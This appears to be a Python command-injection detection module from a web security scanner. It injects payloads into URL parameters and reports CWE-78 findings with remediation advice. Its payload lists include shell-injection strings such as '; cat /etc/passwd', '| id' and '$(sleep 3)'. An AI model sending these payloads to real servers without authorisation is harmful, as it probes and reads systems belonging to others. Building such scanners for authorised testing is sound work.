"""
Command Injection Detection Module
Tests for OS command injection vulnerabilities using time-delay
and error-signature techniques on URL parameters and forms.
"""

import time
import requests
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse


# ── Payloads ──────────────────────────────────────────────────────────────────
# (payload, expected_delay_seconds, platform_hint)
TIME_PAYLOADS = [
    ("; sleep 3",          3, "unix"),
    ("| sleep 3",          3, "unix"),
    ("&& sleep 3",         3, "unix"),
    ("`sleep 3`",          3, "unix"),
    ("$(sleep 3)",         3, "unix"),
    (" || sleep 3 ||",     3, "unix"),
    ("& ping -n 3 127.0.0.1", 3, "windows"),
    ("| ping /n 3 127.0.0.1", 3, "windows"),
]

# Error-output payloads — look for OS artifacts in response
OUTPUT_PAYLOADS = [
    ("; echo CMDINJECTED123",         "CMDINJECTED123", "unix"),
    ("| echo CMDINJECTED123",         "CMDINJECTED123", "unix"),
    ("& echo CMDINJECTED123",         "CMDINJECTED123", "windows"),
    ("; cat /etc/passwd",             "root:x:",        "unix"),
    ("; type C:\\Windows\\win.ini",   "[extensions]",   "windows"),
    ("| id",                          "uid=",           "unix"),
    ("; whoami",                      "root\nwww-data\nadmin", "unix"),
]

# Common error signatures that indicate command execution context
ERROR_SIGNATURES = [
    "sh: ", "bash: ", "cmd.exe", "command not found",
    "no such file or directory", "permission denied",
    "syntax error", "unexpected token",
    "/bin/sh", "/usr/bin", "drwxr",
]


def _inject_param(url: str, param: str, payload: str) -> str:
    parsed = urlparse(url)
    params = parse_qs(parsed.query, keep_blank_values=True)
    params[param] = [payload]
    new_query = urlencode(params, doseq=True)
    return urlunparse(parsed._replace(query=new_query))


def test_command_injection(url: str, timeout: int = 10, quick_mode: bool = False, session=None) -> list:
    _req = session if session is not None else requests
    findings = []
    parsed = urlparse(url)
    params = list(parse_qs(parsed.query, keep_blank_values=True).keys())
    if not params:
        return findings

    session = requests.Session()
    session.headers.update({"User-Agent": "Mozilla/5.0 (Security Scanner)"})

    # In quick mode: only use output-based detection (no sleep delays)
    output_payloads = OUTPUT_PAYLOADS[:3] if quick_mode else OUTPUT_PAYLOADS
    time_payloads   = [] if quick_mode else TIME_PAYLOADS[:4]

    seen = set()

    for param in params:
        if param in seen:
            continue

        # ── 1. Output-based detection (fast) ─────────────────────────────────
        for payload, marker, _ in output_payloads:
            test_url = _inject_param(url, param, payload)
            try:
                resp = session.get(test_url, timeout=timeout, allow_redirects=False,
                                   verify=False)
                text = resp.text.lower()
                if marker.lower() in text:
                    seen.add(param)
                    findings.append({
                        "name": "OS Command Injection",
                        "type": "Command Injection",
                        "severity": "Critical",
                        "cvss_score": 9.8,
                        "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                        "category": "command_injection",
                        "url_affected": url,
                        "parameter": param,
                        "evidence": f"Payload '{payload}' caused output '{marker}' to appear in response",
                        "request_data": test_url,
                        "response_data": resp.text[:500],
                        "cwe_id": "CWE-78",
                        "owasp_category": "A03:2021",
                        "detail": (
                            f"The parameter '{param}' is vulnerable to OS command injection. "
                            f"The server executed the injected command and its output appeared in the response."
                        ),
                        "remediation": (
                            "Never pass user input directly to OS commands. Use subprocess with "
                            "argument lists (never shell=True), validate/whitelist all inputs, "
                            "and apply the principle of least privilege to the server process."
                        ),
                        "references": [
                            "https://owasp.org/www-community/attacks/Command_Injection",
                            "https://cwe.mitre.org/data/definitions/78.html",
                            "https://cheatsheetseries.owasp.org/cheatsheets/OS_Command_Injection_Defense_Cheat_Sheet.html",
                        ],
                    })
                    break
            except Exception:
                continue

        if param in seen:
            continue

        # ── 2. Error-signature detection ──────────────────────────────────────
        for payload, _, _ in output_payloads:
            test_url = _inject_param(url, param, payload)
            try:
                resp = session.get(test_url, timeout=timeout, allow_redirects=False,
                                   verify=False)
                text = resp.text.lower()
                for sig in ERROR_SIGNATURES:
                    if sig in text:
                        seen.add(param)
                        findings.append({
                            "name": "OS Command Injection (Error Signature)",
                            "type": "Command Injection",
                            "severity": "High",
                            "cvss_score": 8.1,
                            "cvss_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
                            "category": "command_injection",
                            "url_affected": url,
                            "parameter": param,
                            "evidence": f"Shell error signature '{sig}' detected in response to payload '{payload}'",
                            "request_data": test_url,
                            "response_data": resp.text[:500],
                            "cwe_id": "CWE-78",
                            "owasp_category": "A03:2021",
                            "detail": (
                                f"Shell error text detected in response — the server may be "
                                f"passing parameter '{param}' to a shell command."
                            ),
                            "remediation": (
                                "Sanitize all inputs used in OS commands. Use parameterized "
                                "subprocess calls and avoid shell=True."
                            ),
                            "references": [
                                "https://owasp.org/www-community/attacks/Command_Injection",
                                "https://cwe.mitre.org/data/definitions/78.html",
                            ],
                        })
                        break
            except Exception:
                continue
            if param in seen:
                break

        if param in seen:
            continue

        # ── 3. Time-based blind detection ─────────────────────────────────────
        for payload, expected_delay, platform in time_payloads:
            test_url = _inject_param(url, param, payload)
            start = time.monotonic()
            try:
                session.get(test_url, timeout=expected_delay + 6,
                            allow_redirects=False, verify=False)
            except requests.Timeout:
                # Timeout itself is also evidence
                elapsed = time.monotonic() - start
            except Exception:
                continue
            else:
                elapsed = time.monotonic() - start

            if elapsed >= expected_delay * 0.85:
                seen.add(param)
                findings.append({
                    "name": "OS Command Injection (Time-Based Blind)",
                    "type": "Command Injection",
                    "severity": "Critical",
                    "cvss_score": 9.8,
                    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
                    "category": "command_injection",
                    "url_affected": url,
                    "parameter": param,
                    "evidence": (
                        f"Response delayed {elapsed:.1f}s with sleep payload '{payload}' "
                        f"(expected {expected_delay}s) — indicates blind command injection"
                    ),
                    "request_data": test_url,
                    "response_data": "",
                    "cwe_id": "CWE-78",
                    "owasp_category": "A03:2021",
                    "detail": (
                        f"Time-based blind command injection detected in parameter '{param}'. "
                        f"The server delayed its response by ~{elapsed:.1f}s indicating the "
                        f"injected sleep command was executed."
                    ),
                    "remediation": (
                        "Remove or sandbox all OS command calls. Validate inputs strictly. "
                        "Use subprocess lists, not shell strings."
                    ),
                    "references": [
                        "https://owasp.org/www-community/attacks/Command_Injection",
                        "https://cwe.mitre.org/data/definitions/78.html",
                    ],
                })
                break

    return findings
